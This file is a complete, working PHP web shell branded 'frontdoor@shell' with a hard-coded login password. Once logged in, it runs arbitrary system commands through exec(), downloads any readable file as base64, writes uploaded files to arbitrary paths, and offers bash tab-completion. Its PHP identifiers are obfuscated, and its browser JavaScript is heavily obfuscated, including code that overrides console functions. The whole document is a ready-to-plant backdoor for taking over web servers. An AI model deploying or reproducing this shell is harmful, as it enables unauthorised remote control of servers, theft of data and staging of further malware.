<?php
$password = "knock2iamhome!";

session_start();

function qah8b5c6291($nqx2f5c1cc0, $mag9f71e61b)
{
    $ubzc2c94c1c = array();

    if (preg_match("/^\s*cd\s*$/", $nqx2f5c1cc0)) {
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $nqx2f5c1cc0)) {
        chdir($mag9f71e61b);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $nqx2f5c1cc0, $drj7a5bc505);
        chdir($drj7a5bc505[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $nqx2f5c1cc0)) {
        chdir($mag9f71e61b);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $nqx2f5c1cc0, $drj7a5bc505);
        return umac4339a52($drj7a5bc505[1]);
    } else {
        chdir($mag9f71e61b);
        exec($nqx2f5c1cc0, $ubzc2c94c1c);
    }

    return array(
        "stdout" => $ubzc2c94c1c,
        "cwd" => getcwd()
    );
}

function agfbff9c09b()
{
    return array("cwd" => getcwd());
}

function bms9bf2f024($tpi9c39465b, $mag9f71e61b, $arp8cde5729)
{
    chdir($mag9f71e61b);
    if ($arp8cde5729 == 'cmd') {
        $nqx2f5c1cc0 = "compgen -c $tpi9c39465b";
    } else {
        $nqx2f5c1cc0 = "compgen -f $tpi9c39465b";
    }
    $nqx2f5c1cc0 = "/bin/bash -c \"$nqx2f5c1cc0\"";
    $dov6354059 = explode("\n", shell_exec($nqx2f5c1cc0));
    return array(
        'files' => $dov6354059,
    );
}

function umac4339a52($wbuc94eb352)
{
    $mqw8c9f3610 = @file_get_contents($wbuc94eb352);
    if ($mqw8c9f3610 === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($wbuc94eb352),
            'file' => base64_encode($mqw8c9f3610)
        );
    }
}

function wxf537705bc($kqvb548b0f, $mqw8c9f3610, $mag9f71e61b)
{
    chdir($mag9f71e61b);
    $jgk76d32be0 = @fopen($kqvb548b0f, 'wb');
    if ($jgk76d32be0 === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($jgk76d32be0, base64_decode($mqw8c9f3610));
        fclose($jgk76d32be0);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}

function tws7106168c()
{
    $_SESSION["logged_in"] = FALSE;

    return array(
        "stdout" => ["Logged out..."],
        "cwd" => "Login"
    );
}

if (isset($_GET["feature"])) {

    $bjc3e7b0bfb = NULL;

    if (!isset($_SESSION["logged_in"]) || $_SESSION["logged_in"] !== TRUE) {
        if (isset($_POST["cmd"]) && $_POST["cmd"] === $password) {
            $_SESSION["logged_in"] = TRUE;
            $bjc3e7b0bfb = array(
                "stdout" => ["Login success..."],
                "cwd" => getcwd()
            );
        } else {
            $bjc3e7b0bfb = array(
                "stdout" => ["Please input correct password to continue..."],
                "cwd" => "Login"
            );
        }
    } else {
        switch ($_GET["feature"]) {
            case "shell":
                $nqx2f5c1cc0 = $_POST['cmd'];
                if (!preg_match('/2>/', $nqx2f5c1cc0)) {
                    $nqx2f5c1cc0 .= ' 2>&1';
                }
                $bjc3e7b0bfb = qah8b5c6291($nqx2f5c1cc0, $_POST["cwd"]);
                break;
            case "pwd":
                $bjc3e7b0bfb = agfbff9c09b();
                break;
            case "hint":
                $bjc3e7b0bfb = bms9bf2f024($_POST['filename'], $_POST['cwd'], $_POST['type']);
                break;
            case 'upload':
                $bjc3e7b0bfb = wxf537705bc($_POST['path'], $_POST['file'], $_POST['cwd']);
                break;
            case "logout":
                $bjc3e7b0bfb = tws7106168c();
                break;
        }
    }

    header("Content-Type: application/json");
    echo json_encode($bjc3e7b0bfb);
    die();
}

?>

<!DOCTYPE html>

<html>

<head>
    <meta charset="UTF-8" />
    <title>frontdoor@shell:~#</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            background: #333;
            color: #eee;
            font-family: monospace;
        }

        #shell {
            background: #222;
            max-width: 800px;
            margin: 50px auto 0 auto;
            box-shadow: 0 0 5px rgba(0, 0, 0, .3);
            font-size: 10pt;
            display: flex;
            flex-direction: column;
            align-items: stretch;
        }

        #shell-content {
            height: 500px;
            overflow: auto;
            padding: 5px;
            white-space: pre-wrap;
            flex-grow: 1;
        }

        #shell-logo {
            font-weight: bold;
            color: #FF4180;
            text-align: center;
        }

        @media (max-width: 991px) {
            #shell-logo {
                display: none;
            }

            html,
            body,
            #shell {
                height: 100%;
                width: 100%;
                max-width: none;
            }

            #shell {
                margin-top: 0;
            }
        }

        @media (max-width: 767px) {
            #shell-input {
                flex-direction: column;
            }
        }

        .shell-prompt {
            font-weight: bold;
            color: #75DF0B;
        }

        .shell-prompt>span {
            color: #1BC9E7;
        }

        #shell-input {
            display: flex;
            box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);
            border-top: rgba(255, 255, 255, .05) solid 1px;
        }

        #shell-input>label {
            flex-grow: 0;
            display: block;
            padding: 0 5px;
            height: 30px;
            line-height: 30px;
        }

        #shell-input #shell-cmd {
            height: 30px;
            line-height: 30px;
            border: none;
            background: transparent;
            color: #eee;
            font-family: monospace;
            font-size: 10pt;
            width: 100%;
            align-self: center;
        }

        #shell-input div {
            flex-grow: 1;
            align-items: stretch;
        }

        #shell-input input {
            outline: none;
        }
    </style>

    <script>
        var _0x58ad = [
            'Enter',
            '</span>\x20',
            'preventDefault',
            'setAttribute',
            'exception',
            'length',
            'apply',
            '&amp;',
            'type',
            'click',
            'data:application/octet-stream;base64,',
            'match',
            '?feature=pwd',
            'change',
            'createElement',
            '<span\x20class=\x22shell-prompt\x22>',
            'blur',
            'log',
            'status',
            'innerHTML',
            'push',
            'setRequestHeader',
            '?feature=logout',
            '{}.constructor(\x22return\x20this\x22)(\x20)',
            'responseText',
            'addEventListener',
            'trim',
            'bind',
            'body',
            'application/x-www-form-urlencoded',
            'hasOwnProperty',
            'constructor',
            'cmd',
            'none',
            '&lt;',
            'files',
            'open',
            'onerror',
            'focus',
            'file',
            'result',
            'join',
            'cwd',
            '&gt;',
            'Error\x20while\x20parsing\x20response:\x20',
            'test',
            'split',
            'table',
            'removeChild',
            'then',
            'value',
            'shell-prompt',
            'warn',
            'scrollTop',
            'stdout',
            'shell-cmd',
            'toString',
            'appendChild',
            'name',
            'getElementById',
            '?feature=upload',
            'download',
            'replace',
            'shell-content',
            'input',
            'prototype',
            'display',
            'ArrowUp',
            '</span>#',
            'send',
            'scrollHeight',
            'style',
            'POST',
            'trace',
            'An\x20unknown\x20client-side\x20error\x20occurred.',
            'return\x20(function()\x20',
            'frontdoor@shell:<span\x20title=\x22'
        ];
        (function(_0x58cb4d, _0x394e04) {
            var _0x58adee = function(_0x30f3d1) {
                while (--_0x30f3d1) {
                    _0x58cb4d['push'](_0x58cb4d['shift']());
                }
            };
            _0x58adee(++_0x394e04);
        }(_0x58ad, 0x186));
        var _0x30f3 = function(_0x58cb4d, _0x394e04) {
            _0x58cb4d = _0x58cb4d - 0x13d;
            var _0x58adee = _0x58ad[_0x58cb4d];
            return _0x58adee;
        };
        var _0x49be73 = function() {
            var _0x45fe27 = !![];
            return function(_0x12ba91, _0x262e4a) {
                var _0x6fe2bb = _0x45fe27 ? function() {
                    var _0x26dafe = _0x30f3;
                    if (_0x262e4a) {
                        var _0xab84c8 = _0x262e4a[_0x26dafe(0x13e)](_0x12ba91, arguments);
                        _0x262e4a = null;
                        return _0xab84c8;
                    }
                } : function() {};
                _0x45fe27 = ![];
                return _0x6fe2bb;
            };
        }();
        var _0x40419f = _0x49be73(this, function() {
            var _0x3a7b11 = _0x30f3;
            var _0x560cef = function() {
                var _0x2aa871 = _0x30f3;
                var _0x10fdfc;
                try {
                    _0x10fdfc = Function(_0x2aa871(0x183) + _0x2aa871(0x14f) + ');')();
                } catch (_0x218f8f) {
                    _0x10fdfc = window;
                }
                return _0x10fdfc;
            };
            var _0x30c034 = _0x560cef();
            var _0x40009d = _0x30c034['console'] = _0x30c034['console'] || {};
            var _0x1f6907 = [
                _0x3a7b11(0x149),
                _0x3a7b11(0x16c),
                'info',
                'error',
                _0x3a7b11(0x189),
                _0x3a7b11(0x167),
                _0x3a7b11(0x181)
            ];
            for (var _0x25d2ca = 0x0; _0x25d2ca < _0x1f6907[_0x3a7b11(0x13d)]; _0x25d2ca++) {
                var _0xaa5992 = _0x49be73[_0x3a7b11(0x157)][_0x3a7b11(0x179)][_0x3a7b11(0x153)](_0x49be73);
                var _0x5043a9 = _0x1f6907[_0x25d2ca];
                var _0x4cf10a = _0x40009d[_0x5043a9] || _0xaa5992;
                _0xaa5992['__proto__'] = _0x49be73['bind'](_0x49be73);
                _0xaa5992['toString'] = _0x4cf10a[_0x3a7b11(0x170)][_0x3a7b11(0x153)](_0x4cf10a);
                _0x40009d[_0x5043a9] = _0xaa5992;
            }
        });
        _0x40419f();
        var CWD = null;
        var commandHistory = [];
        var historyPosition = 0x0;
        var eShellCmdInput = null;
        var eShellContent = null;

        function _insertCommand(_0x2175af) {
            var _0x5e49f7 = _0x30f3;
            eShellContent[_0x5e49f7(0x14b)] += '\x0a\x0a';
            eShellContent[_0x5e49f7(0x14b)] += _0x5e49f7(0x147) + genPrompt(CWD) + _0x5e49f7(0x186);
            eShellContent[_0x5e49f7(0x14b)] += escapeHtml(_0x2175af);
            eShellContent[_0x5e49f7(0x14b)] += '\x0a';
            eShellContent[_0x5e49f7(0x16d)] = eShellContent[_0x5e49f7(0x17e)];
        }

        function _insertStdout(_0x47fb56) {
            var _0x9d9578 = _0x30f3;
            eShellContent[_0x9d9578(0x14b)] += escapeHtml(_0x47fb56);
            eShellContent[_0x9d9578(0x16d)] = eShellContent[_0x9d9578(0x17e)];
        }

        function featureShell(_0xb6c6b0) {
            var _0x1f94a1 = _0x30f3;
            _insertCommand(_0xb6c6b0);
            if (/^\s*upload\s+[^\s]+\s*$/ [_0x1f94a1(0x165)](_0xb6c6b0)) {
                featureUpload(_0xb6c6b0['match'](/^\s*upload\s+([^\s]+)\s*$/)[0x1]);
            } else if (/^\s*logout\s*$/ ['test'](_0xb6c6b0)) {
                makeRequest(_0x1f94a1(0x14e), {
                    'cmd': _0xb6c6b0,
                    'cwd': CWD
                }, function(_0x37a3ea) {
                    var _0x1d4ee2 = _0x1f94a1;
                    _insertStdout(_0x37a3ea[_0x1d4ee2(0x16e)]['join']('\x0a'));
                    updateCwd(_0x37a3ea[_0x1d4ee2(0x162)]);
                });
            } else if (/^\s*clear\s*$/ [_0x1f94a1(0x165)](_0xb6c6b0)) {
                eShellContent['innerHTML'] = '';
            } else {
                makeRequest('?feature=shell', {
                    'cmd': _0xb6c6b0,
                    'cwd': CWD
                }, function(_0x122626) {
                    var _0x5462b5 = _0x1f94a1;
                    if (_0x122626[_0x5462b5(0x156)]('file')) {
                        featureDownload(_0x122626[_0x5462b5(0x172)], _0x122626[_0x5462b5(0x15f)]);
                    } else {
                        _insertStdout(_0x122626['stdout'][_0x5462b5(0x161)]('\x0a'));
                        updateCwd(_0x122626[_0x5462b5(0x162)]);
                    }
                });
            }
        }

        function featureHint() {
            var _0x1af544 = _0x30f3;
            if (eShellCmdInput[_0x1af544(0x16a)][_0x1af544(0x152)]()[_0x1af544(0x13d)] === 0x0)
                return;

            function _0x1742d0(_0x58a139) {
                var _0x55feb9 = _0x1af544;
                if (_0x58a139[_0x55feb9(0x15b)][_0x55feb9(0x13d)] <= 0x1)
                    return;
                if (_0x58a139[_0x55feb9(0x15b)]['length'] === 0x2) {
                    if (_0x346c36 === _0x55feb9(0x158)) {
                        eShellCmdInput[_0x55feb9(0x16a)] = _0x58a139[_0x55feb9(0x15b)][0x0];
                    } else {
                        var _0x27dc06 = eShellCmdInput['value'];
                        eShellCmdInput[_0x55feb9(0x16a)] = _0x27dc06[_0x55feb9(0x176)](/([^\s]*)$/, _0x58a139['files'][0x0]);
                    }
                } else {
                    _insertCommand(eShellCmdInput[_0x55feb9(0x16a)]);
                    _insertStdout(_0x58a139[_0x55feb9(0x15b)][_0x55feb9(0x161)]('\x0a'));
                }
            }
            var _0x1cf961 = eShellCmdInput[_0x1af544(0x16a)][_0x1af544(0x166)]('\x20');
            var _0x346c36 = _0x1cf961['length'] === 0x1 ? 'cmd' : _0x1af544(0x15f);
            var _0x461486 = _0x346c36 === _0x1af544(0x158) ? _0x1cf961[0x0] : _0x1cf961[_0x1cf961[_0x1af544(0x13d)] - 0x1];
            makeRequest('?feature=hint', {
                'filename': _0x461486,
                'cwd': CWD,
                'type': _0x346c36
            }, _0x1742d0);
        }

        function featureDownload(_0x4c59de, _0x24eaeb) {
            var _0xea80dd = _0x30f3;
            var _0x5de8ee = document[_0xea80dd(0x146)]('a');
            _0x5de8ee['setAttribute']('href', _0xea80dd(0x142) + _0x24eaeb);
            _0x5de8ee[_0xea80dd(0x188)](_0xea80dd(0x175), _0x4c59de);
            _0x5de8ee[_0xea80dd(0x17f)]['display'] = 'none';
            document[_0xea80dd(0x154)][_0xea80dd(0x171)](_0x5de8ee);
            _0x5de8ee[_0xea80dd(0x141)]();
            document[_0xea80dd(0x154)][_0xea80dd(0x168)](_0x5de8ee);
            _insertStdout('Done.');
        }

        function featureUpload(_0x3513ff) {
            var _0x65de0e = _0x30f3;
            var _0x9f2f3 = document['createElement'](_0x65de0e(0x178));
            _0x9f2f3['setAttribute'](_0x65de0e(0x140), _0x65de0e(0x15f));
            _0x9f2f3[_0x65de0e(0x17f)][_0x65de0e(0x17a)] = _0x65de0e(0x159);
            document['body']['appendChild'](_0x9f2f3);
            _0x9f2f3[_0x65de0e(0x151)](_0x65de0e(0x145), function() {
                var _0x485e3a = _0x65de0e;
                var _0x51e603 = getBase64(_0x9f2f3[_0x485e3a(0x15b)][0x0]);
                _0x51e603[_0x485e3a(0x169)](function(_0x55add3) {
                    var _0x58f3f2 = _0x485e3a;
                    makeRequest(_0x58f3f2(0x174), {
                        'path': _0x3513ff,
                        'file': _0x55add3,
                        'cwd': CWD
                    }, function(_0x5c9aa5) {
                        var _0x39e653 = _0x58f3f2;
                        _insertStdout(_0x5c9aa5[_0x39e653(0x16e)][_0x39e653(0x161)]('\x0a'));
                        updateCwd(_0x5c9aa5[_0x39e653(0x162)]);
                    });
                }, function() {
                    var _0x3e87b0 = _0x485e3a;
                    _insertStdout(_0x3e87b0(0x182));
                });
            });
            _0x9f2f3[_0x65de0e(0x141)]();
            document[_0x65de0e(0x154)][_0x65de0e(0x168)](_0x9f2f3);
        }

        function getBase64(_0x4c0753, _0x16a550) {
            return new Promise(function(_0x4ad1e2, _0x25dd2a) {
                var _0x7e78c9 = _0x30f3;
                var _0x4c70b8 = new FileReader();
                _0x4c70b8['onload'] = function() {
                    var _0xbd42fb = _0x30f3;
                    _0x4ad1e2(_0x4c70b8[_0xbd42fb(0x160)][_0xbd42fb(0x143)](/base64,(.*)$/)[0x1]);
                };
                _0x4c70b8[_0x7e78c9(0x15d)] = _0x25dd2a;
                _0x4c70b8['readAsDataURL'](_0x4c0753);
            });
        }

        function genPrompt(_0x1f3648) {
            var _0x4bfe74 = _0x30f3;
            _0x1f3648 = _0x1f3648 || '~';
            var _0x421a3e = _0x1f3648;
            if (_0x1f3648[_0x4bfe74(0x166)]('/')['length'] > 0x3) {
                var _0x422bc0 = _0x1f3648[_0x4bfe74(0x166)]('/');
                _0x421a3e = '…/' + _0x422bc0[_0x422bc0[_0x4bfe74(0x13d)] - 0x2] + '/' + _0x422bc0[_0x422bc0[_0x4bfe74(0x13d)] - 0x1];
            }
            return _0x4bfe74(0x184) + _0x1f3648 + '\x22>' + _0x421a3e + _0x4bfe74(0x17c);
        }

        function updateCwd(_0x1bbff2) {
            var _0x17983e = _0x30f3;
            if (_0x1bbff2) {
                CWD = _0x1bbff2;
                _updatePrompt();
                return;
            }
            makeRequest(_0x17983e(0x144), {}, function(_0x4b8fbd) {
                var _0x11dabf = _0x17983e;
                CWD = _0x4b8fbd[_0x11dabf(0x162)];
                _updatePrompt();
            });
        }

        function escapeHtml(_0x4d620c) {
            var _0x59c70b = _0x30f3;
            return _0x4d620c['replace'](/&/g, _0x59c70b(0x13f))['replace'](/</g, _0x59c70b(0x15a))[_0x59c70b(0x176)](/>/g, _0x59c70b(0x163));
        }

        function _updatePrompt() {
            var _0x225234 = _0x30f3;
            var _0x25723d = document[_0x225234(0x173)](_0x225234(0x16b));
            _0x25723d[_0x225234(0x14b)] = genPrompt(CWD);
        }

        function _onShellCmdKeyDown(_0x2aee82) {
            var _0x285aa5 = _0x30f3;
            switch (_0x2aee82['key']) {
                case _0x285aa5(0x185):
                    featureShell(eShellCmdInput[_0x285aa5(0x16a)]);
                    insertToHistory(eShellCmdInput[_0x285aa5(0x16a)]);
                    eShellCmdInput[_0x285aa5(0x16a)] = '';
                    break;
                case _0x285aa5(0x17b):
                    if (historyPosition > 0x0) {
                        historyPosition--;
                        eShellCmdInput[_0x285aa5(0x148)]();
                        eShellCmdInput['focus']();
                        eShellCmdInput[_0x285aa5(0x16a)] = commandHistory[historyPosition];
                    }
                    break;
                case 'ArrowDown':
                    if (historyPosition >= commandHistory[_0x285aa5(0x13d)]) {
                        break;
                    }
                    historyPosition++;
                    if (historyPosition === commandHistory[_0x285aa5(0x13d)]) {
                        eShellCmdInput[_0x285aa5(0x16a)] = '';
                    } else {
                        eShellCmdInput[_0x285aa5(0x148)]();
                        eShellCmdInput[_0x285aa5(0x15e)]();
                        eShellCmdInput['value'] = commandHistory[historyPosition];
                    }
                    break;
                case 'Tab':
                    _0x2aee82[_0x285aa5(0x187)]();
                    featureHint();
                    break;
            }
        }

        function insertToHistory(_0x4f2f59) {
            var _0x13ddbd = _0x30f3;
            commandHistory[_0x13ddbd(0x14c)](_0x4f2f59);
            historyPosition = commandHistory[_0x13ddbd(0x13d)];
        }

        function makeRequest(_0x50e6f1, _0x45e7a5, _0x465bb1) {
            var _0x2aef05 = _0x30f3;

            function _0x20880d() {
                var _0x17f0a8 = _0x30f3;
                var _0x330694 = [];
                for (var _0x4262be in _0x45e7a5) {
                    if (_0x45e7a5[_0x17f0a8(0x156)](_0x4262be)) {
                        _0x330694[_0x17f0a8(0x14c)](encodeURIComponent(_0x4262be) + '=' + encodeURIComponent(_0x45e7a5[_0x4262be]));
                    }
                }
                return _0x330694[_0x17f0a8(0x161)]('&');
            }
            var _0xd3a7e9 = new XMLHttpRequest();
            _0xd3a7e9[_0x2aef05(0x15c)](_0x2aef05(0x180), _0x50e6f1, !![]);
            _0xd3a7e9[_0x2aef05(0x14d)]('Content-Type', _0x2aef05(0x155));
            _0xd3a7e9['onreadystatechange'] = function() {
                var _0x19db2d = _0x2aef05;
                if (_0xd3a7e9['readyState'] === 0x4 && _0xd3a7e9[_0x19db2d(0x14a)] === 0xc8) {
                    try {
                        var _0x22bf1e = JSON['parse'](_0xd3a7e9[_0x19db2d(0x150)]);
                        _0x465bb1(_0x22bf1e);
                    } catch (_0x473a8f) {
                        alert(_0x19db2d(0x164) + _0x473a8f);
                    }
                }
            };
            _0xd3a7e9[_0x2aef05(0x17d)](_0x20880d());
        }
        window['onload'] = function() {
            var _0x35a047 = _0x30f3;
            eShellCmdInput = document[_0x35a047(0x173)](_0x35a047(0x16f));
            eShellContent = document['getElementById'](_0x35a047(0x177));
            updateCwd();
            eShellCmdInput[_0x35a047(0x15e)]();
        };
    </script>
</head>

<body>
    <div id="shell">
        <pre id="shell-content">
                <div id="shell-logo">
  ______               _   _____                              _          _ _   _   _  _   <span></span>
 |  ____|             | | |  __ \                   ____     | |        | | |_( )_| || |_ <span></span>
 | |__ _ __ ___  _ __ | |_| |  | | ___   ___  _ __ / __ \ ___| |__   ___| | (_)/|_  __  _|<span></span>
 |  __| '__/ _ \| '_ \| __| |  | |/ _ \ / _ \| '__/ / _` / __| '_ \ / _ \ | |    _| || |_ <span></span>
 | |  | | | (_) | | | | |_| |__| | (_) | (_) | | | | (_| \__ \ | | |  __/ | |_  |_  __  _|<span></span>
 |_|  |_|  \___/|_| |_|\__|_____/ \___/ \___/|_|  \ \__,_|___/_| |_|\___|_|_(_)   |_||_|  <span></span>
                                                   \____/                                 <span></span>
                </div>
            </pre>
        <div id="shell-input">
            <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
            <div>
                <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)" />
            </div>
        </div>
    </div>
</body>

</html>